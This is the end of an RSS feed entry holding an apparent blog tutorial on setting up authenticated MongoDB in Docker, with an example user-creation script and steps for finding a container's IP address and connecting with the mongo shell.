<li><strong>MONGO_INITDB_ROOT_USERNAME_FILE</strong> sets the environment variable for <strong>MONGO_INITDB_ROOT_USERNAME</strong> from the contents of the file specified in the parameter.</li>
<li><strong>MONGO_INITDB_ROOT_PASSWORD_FILE</strong> sets the environment variable for <strong>MONGO_INITDB_ROOT_PASSWORD</strong> from the contents of the file specified in the parameter.</li>
<li>These variables will be used to set the admin credentials.</li>
<li> No <em>--auth</em> parameter is required since the specification of the username and password credentials automatically enable authentication.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>⇨  An exapmle <code>init.sh</code> file is shown to setup new users:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/env bash
</span><span style="color:#75715e"></span>echo <span style="color:#e6db74">&#34;Creating mongo users...&#34;</span>
mongo --authenticationDatabase admin --host localhost -u hexterisk -p strongPassword tac --eval <span style="color:#e6db74">&#34;db.createUser({user: &#39;normal&#39;, pwd: &#39;normal&#39;, roles: [{role: &#39;readWrite&#39;, db: &#39;tac&#39;}]});&#34;</span>
mongo --authenticationDatabase admin --host localhost -u hexterisk -p strongPassword admin --eval <span style="color:#e6db74">&#34;db.createUser({user: &#39;admin&#39;, pwd: &#39;pass&#39;, roles: [{role: &#39;userAdminAnyDatabase&#39;, db: &#39;admin&#39;}]});&#34;</span>
echo <span style="color:#e6db74">&#34;Mongo users created.&#34;</span>
</code></pre></div><p><code>docker-compose up</code></p>
<p><img src="/Authenticated_Mongodb/15_image.png" alt="&ldquo;user_created&rdquo;">
<em>Executing the above command gives a lot of output. Similar output will be present at the part where new users are being setup.</em></p>
<h2 id="connecting-to-the-mongo-container">Connecting to the Mongo container</h2>
<p>MongoDB server can now be connected as long as the IP address is known for the container.</p>
<p>Container&rsquo;s IP Address can be found out by:</p>
<p><code>docker inspect --format '{{ .NetworkSettings.IPAddress }}' CONTAINER_NAME/CONTAINER_ID</code></p>
<p><img src="/Authenticated_Mongodb/13_image.png" alt="&ldquo;ipaddr&rdquo;">
<em>Output gives the container&rsquo;s IPAddress.</em></p>
<p>If the output is empty, simply run:</p>
<p><code>docker inspect CONTAINER_NAME/CONTAINER___ID</code></p>
<p><img src="/Authenticated_Mongodb/14_image.png" alt="&ldquo;ipaddr_inspect&rdquo;">
<em>The last part of the command&rsquo;s output.</em></p>
<p>and search for the <em>IPAddress</em> field in the output.</p>
<p>Then simply connect to the instance by passing the username, password, IPAddress and database as parameters:</p>
<p><code>mongo -u USERNAME -p PASSWORD IPAddress/DATABASE_NAME</code></p>
<p><img src="/Authenticated_Mongodb/12_image.png" alt="&ldquo;connected&rdquo;">
<em>Connect to the container.</em></p>
]]></content>
        </item>
        
    </channel>
</rss>
